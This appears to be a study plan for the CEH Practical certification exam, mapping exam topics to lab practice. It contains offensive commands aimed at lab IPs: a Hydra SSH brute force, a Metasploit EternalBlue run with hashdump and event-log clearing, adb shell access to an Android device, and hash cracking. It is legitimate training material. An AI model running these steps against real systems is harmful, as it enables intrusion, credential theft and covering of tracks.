# 100% CEH Practical Exam Coverage

> Every possible exam task mapped to where you practice it.  
> Nothing left uncovered.  

---

## Coverage Map

| # | Exam Topic (by flag count) | Proxmox CTF | EC-Council Lab | Desktop Practice |
|---|---------------------------|-------------|----------------|-----------------|
| 1 | SQLi / SQLMap (2-3 flags) | ✅ Mission 2.1, 2.5, 6.1 | — | — |
| 2 | Web App Attacks - cmd injection (1-2) | ✅ Mission 2.2, 2.5 | — | — |
| 3 | WordPress / WPScan (1) | ✅ Mission 2.3 | — | — |
| 4 | Web Server Scanning - Nikto/dirb (1) | ✅ Mission 2.4 | — | — |
| 5 | Nmap Scanning & Enumeration (2-3) | ✅ Mission 1.1, 1.2 | — | — |
| 6 | Password Cracking - Hydra online (1-2) | ✅ Mission 3.1, 3.2 | — | — |
| 7 | Password Cracking - Hashcat/John offline (1) | ✅ Mission 3.3 | — | — |
| 8 | SMB/NetBIOS Enumeration (1) | ✅ Mission 4.4 | — | — |
| 9 | SNMP Enumeration (0-1) | ✅ Mission 4.1 | — | — |
| 10 | LDAP Enumeration (0-1) | ✅ Mission 4.5 | — | — |
| 11 | NFS Enumeration (0-1) | ✅ Mission 4.2 | — | — |
| 12 | SMTP Enumeration (0-1) | ✅ Mission 4.3 | — | — |
| 13 | AD - AS-REP Roasting (1) | ✅ Mission 5.1 | — | — |
| 14 | AD - Password Spraying (0-1) | ✅ Mission 5.2 | — | — |
| 15 | AD - Kerberoasting (0-1) | ✅ Mission 5.3 | Lab M06 Task 5 | — |
| 16 | **Steganography (1-2 flags)** | ❌ | ❌ | ✅ Desktop |
| 17 | **Cryptography / VeraCrypt (1-2 flags)** | ❌ | ✅ Lab M20 | — |
| 18 | **Wireshark pcap analysis (1-2 flags)** | ❌ | ❌ | ✅ Desktop |
| 19 | **Android / PhoneSploit (1 flag)** | ❌ | ✅ Lab M17 | — |
| 20 | **Malware Analysis / DIE (1 flag)** | ❌ | ✅ Lab M07 | — |
| 21 | **OpenVAS / CVSS score (1 flag)** | ❌ | ✅ Lab M05 | — |
| 22 | **Metasploit / meterpreter (1-2 flags)** | ❌ | ✅ Lab M06 Task 1 | — |

---

## What's NOT in Proxmox CTF — Must Practice Elsewhere

### 16. Steganography — Practice on Desktop (30 min)

Do this on your Parrot VM or Fedora desktop:  

```bash
# SETUP: Create challenge files
mkdir ~/steg-practice && cd ~/steg-practice  

# --- Challenge A: Steghide ---
# Download any JPEG: wget https://picsum.photos/800/600 -O photo.jpg
echo "FLAG{steghide_secret_found}" > hidden.txt  
steghide embed -cf photo.jpg -ef hidden.txt -p "password123"  
rm hidden.txt  
# PRACTICE: steghide extract -sf photo.jpg -p password123
# PRACTICE: steghide info photo.jpg

# --- Challenge B: Steghide with no password ---
echo "FLAG{no_password_steg}" > hidden2.txt  
steghide embed -cf photo2.jpg -ef hidden2.txt -p ""  
rm hidden2.txt  
# PRACTICE: steghide extract -sf photo2.jpg (just hit enter for blank password)

# --- Challenge C: Snow (whitespace steg) ---
echo "This is a normal looking text file with nothing suspicious." > cover.txt  
snow -C -m "FLAG{snow_whitespace_hidden}" -p "letmein" cover.txt stego.txt  
# PRACTICE: snow -C -p "letmein" stego.txt

# --- Challenge D: Binwalk ---
# Append a zip to a jpeg
echo "FLAG{binwalk_extracted}" > secret.txt  
zip secret.zip secret.txt  
cat photo.jpg secret.zip > suspicious.jpg  
rm secret.txt secret.zip  
# PRACTICE: binwalk suspicious.jpg
# PRACTICE: binwalk -e suspicious.jpg

# --- Challenge E: OpenStego (GUI on Windows exam machine) ---
# Just know: Extract Data → select image → enter password → extract
# Practice once in EC-Council lab if needed
```

**Exam pattern:** "Find the hidden message/password in the image on the Desktop"  
**Strategy:** Try steghide first (with blank password, then common passwords), then binwalk, then OpenStego on Windows machine.  

---

### 17. Cryptography / VeraCrypt — EC-Council Lab M20 (30 min)

**What to practice:**  

| Task | Tool | Where |
|------|------|-------|
| Mount encrypted volume, count files inside | VeraCrypt (Windows GUI) | EC-Council M20 |
| Decrypt file with known algorithm/key | CrypTool (Windows GUI) | EC-Council M20 |
| Calculate file hashes | md5sum/sha256sum | Desktop |
| Compare hashes to find tampered file | md5sum | Desktop |
| Encode/decode text | BCTextEncoder (Windows) | EC-Council M20 |

**Desktop hash practice:**  
```bash
mkdir ~/hash-practice && cd ~/hash-practice  

# Create files, one is tampered
echo "quarterly report 2026 Q1 revenue 1.2M" > report1.txt  
echo "quarterly report 2026 Q2 revenue 1.5M" > report2.txt  
echo "quarterly report 2026 Q3 revenue TAMPERED" > report3.txt  
echo "quarterly report 2026 Q4 revenue 2.1M" > report4.txt  

# PRACTICE: Which file was tampered?
# md5sum report*.txt
# Answer: report3.txt has different hash pattern

# Hash cracking practice
echo '5f4dcc3b5aa765d61d8327deb882cf99' > md5hash.txt    # "password"  
echo '21232f297a57a5a743894a0e4a801fc3' > md5hash2.txt   # "admin"  
echo '8621ffdbc5698829397d97767ac13db3' > md5hash3.txt   # "dragon"  
# PRACTICE: hashcat -m 0 md5hash.txt /usr/share/wordlists/rockyou.txt
```

**Exam pattern:** "Decrypt the VeraCrypt volume and count the files inside" or "Which file was tampered?"  
**Strategy:** On exam Windows machine → open VeraCrypt → select file → mount → browse.  

---

### 18. Wireshark / Packet Analysis — Practice on Desktop (30 min)

```bash
# OPTION A: Capture your own traffic from Proxmox lab

# Terminal 1: Start capture
sudo tcpdump -i any -w lab_capture.pcap host 10.10.55.10 or host 10.10.55.11 &  

# Terminal 2: Generate traffic
ftp 10.10.55.10        # login as ftpuser/hunter2  
hydra -l alice -P /usr/share/wordlists/rockyou.txt 10.10.55.11 ssh -t 4  
curl http://10.10.55.10/sqli.php?id=1  

# Stop capture: kill %1

# Now practice with the pcap:
# Open in Wireshark, practice these filters:
```

**Wireshark exam filters to memorize:**  

| Find This | Filter |
|-----------|--------|
| FTP password | `ftp.request.command == "PASS"` |
| HTTP POST (login forms) | `http.request.method == "POST"` |
| All traffic from IP | `ip.addr == 10.10.55.10` |
| DNS queries | `dns` |
| SMTP traffic | `smtp` |
| Find the scanner | `tcp.flags.syn == 1 && tcp.flags.ack == 0` then Statistics → Conversations |
| Extract file/data | Right-click → Follow → TCP Stream |

**OPTION B: Download pre-made CTF pcaps:**  
- https://wiki.wireshark.org/SampleCaptures  
- Google "wireshark ctf pcap practice"  

**Exam pattern:** "Analyze the capture file. What is the FTP password?" or "What IP was performing the scan?"  

---

### 19. Android / PhoneSploit — EC-Council Lab M17 (30 min max)

**What you'll do in the lab:**  
```
phonesploit  
# or manually:
adb connect [target-ip]:5555  
adb devices  
adb shell  
ls /sdcard/  
adb pull /sdcard/[filename] .  
```

**Exam pattern:** "What files are stored on the Android device at 10.10.X.X?"  
**Strategy:** See port 5555 in nmap → `adb connect [ip]:5555` → `adb shell` → browse → `adb pull`  

**That's it.** It's 1 flag, always the same pattern. 5 minutes in the lab is enough.  

---

### 20. Malware Analysis / Detect It Easy — EC-Council Lab M07 (30 min max)

**What you'll do in the lab:**  
1. Open suspicious .exe file in **Detect It Easy (DIE)** (Windows GUI tool)  
2. Check **Entropy** tab → note the entropy value  
3. Check **Packer** detection → is it packed with UPX?  
4. Check **Strings** → any suspicious strings?  
5. Note file type, compiler info  

**Exam pattern:** "What is the entropy of the file suspicious.exe?" or "What packer was used?"  
**Strategy:** Open in DIE → Entropy tab → copy number → paste as answer.  

**That's it.** 1 flag, pure GUI clicking.  

---

### 21. OpenVAS / Vulnerability Scanning — EC-Council Lab M05 (30 min max)

**What you'll do in the lab:**  
1. `gvm-start` (or it's already running)  
2. Open browser → https://localhost:9392  
3. Scans → Tasks → New Task → set target IP → Full and Fast → Start  
4. Wait for scan to complete  
5. Find the specific CVE/vulnerability → note its **CVSS score**  

**Exam pattern:** "What is the CVSS score of vulnerability X on target Y?"  
**Strategy:** Run scan → search results for the CVE → read the score.  

**Note:** OpenVAS scans take 15-30 minutes. Start it EARLY in the exam if you see a vuln scanning question.  

---

### 22. Metasploit / Meterpreter — You Already Know This

From your M06 lab today. Quick recap for exam:  

```
# Exploit target (usually via SMB)
use exploit/windows/smb/ms17_010_eternalblue   # or psexec  
set RHOSTS [ip]  
set LHOST [your-ip]  
exploit  

# Post-exploitation
getuid → getsystem → hashdump → hashcat -m 1000  
shell → net user → whoami  
search -f flag* → download  
clearev  
```

**Exam pattern:** "What is the password of Administrator on 10.10.X.X?"  
**Strategy:** Exploit → SYSTEM → hashdump → crack NTLM → answer.  

---

## Complete Practice Schedule

### Day 1 (Today): Proxmox CTF
- Install Parrot VM  
- Run through all 20 CTF missions  
- Set up steganography + hash practice files on desktop  

### Day 2: Proxmox CTF Speedrun + Wireshark
- Speedrun all 20 missions (target: <3 hours)  
- Capture lab traffic → practice Wireshark filters  
- Practice steganography challenges  

### Day 3: Speedrun + EC-Council Labs
- Morning: Speedrun CTF again (target: <2 hours)  
- Afternoon: EC-Council speed-runs:  
  - M07 (DIE) — 30 min  
  - M17 (PhoneSploit) — 30 min  
  - M20 (VeraCrypt/CrypTool) — 30 min  
  - M05 (OpenVAS) — 30 min  

### Day 4: Full Mock Exam
- Set 6-hour timer  
- Scan Proxmox lab from scratch (pretend you've never seen it)  
- Use only your cheatsheets  
- Include steg/hash/Wireshark challenges  
- Score yourself: each mission = 1 flag = 10 points  

### Day 5: Review + Weak Spots
- Redo any missions that took >10 minutes  
- Review all cheatsheets  
- Quick pass through EC-Council labs for any tools you're shaky on  
- REST before exam  

---

## Final Checklist — Can You Do These In <5 Min Each?

### Scanning
- [ ] Discover all hosts on a subnet  
- [ ] Full port + service + OS scan  
- [ ] Identify a Domain Controller by ports  

### Web Attacks
- [ ] SQLMap: URL → databases → tables → dump  
- [ ] Command injection: read /etc/passwd  
- [ ] WPScan: enumerate users + brute force  
- [ ] Nikto + dirb scan  

### Password Cracking
- [ ] Hydra: FTP, SSH, RDP, HTTP-form  
- [ ] Hashcat: MD5 (-m 0), NTLM (-m 1000), Kerberos (-m 13100, -m 18200)  
- [ ] John: basic wordlist crack  
- [ ] Identify hash type by looking at it  

### Enumeration
- [ ] enum4linux -a  
- [ ] snmpwalk with public community string  
- [ ] showmount + mount NFS  
- [ ] smtp-user-enum  
- [ ] ldapsearch anonymous bind  

### AD Attacks
- [ ] GetNPUsers.py (AS-REP Roast)  
- [ ] CrackMapExec password spray  
- [ ] Kerberoasting with GetUserSPNs.py  

### Steganography
- [ ] steghide extract (with and without password)  
- [ ] snow extract  
- [ ] binwalk detect + extract  
- [ ] OpenStego (know the GUI flow)  

### Cryptography
- [ ] md5sum / sha256sum to compare files  
- [ ] VeraCrypt mount (know the GUI flow)  
- [ ] CrypTool decrypt (know the GUI flow)  

### Wireshark
- [ ] Filter by protocol (ftp, http, dns)  
- [ ] Find credentials in pcap  
- [ ] Follow TCP Stream  
- [ ] Identify scanning activity  

### Mobile
- [ ] adb connect + adb shell + adb pull  

### Malware
- [ ] Open file in DIE → read entropy + packer  

### Vuln Scanning
- [ ] Start OpenVAS scan → find CVSS score  

### Metasploit
- [ ] EternalBlue or psexec → meterpreter  
- [ ] getsystem → hashdump  
- [ ] search + download files  
- [ ] clearev  
